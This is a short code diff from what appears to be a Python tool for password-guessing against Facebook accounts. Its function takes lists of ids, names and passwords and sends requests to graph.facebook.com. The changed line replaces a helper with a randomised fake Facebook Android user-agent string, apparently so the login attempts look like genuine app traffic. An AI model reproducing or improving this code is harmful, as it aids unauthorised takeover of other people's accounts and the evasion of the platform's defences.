@@ -14,7 +14,7 @@ def api1(ids,names,passlist,total_ids):
 			en1 = random.choice(["GB","US"])
 			network = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]" 
-			head = {'User-Agent': iAmAndroidUa(),
+			head = {'User-Agent': ua,
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': '31002',
